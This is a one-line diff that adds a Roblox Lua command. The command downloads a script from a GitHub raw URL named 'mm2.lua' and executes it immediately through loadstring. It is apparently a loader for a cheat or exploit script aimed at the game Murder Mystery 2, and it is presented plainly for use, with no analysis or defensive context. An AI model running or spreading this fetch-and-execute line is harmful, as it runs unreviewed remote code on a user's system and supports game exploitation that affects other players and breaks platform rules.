@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xscriptsz/Noctra/refs/heads/main/mm2.lua"))()
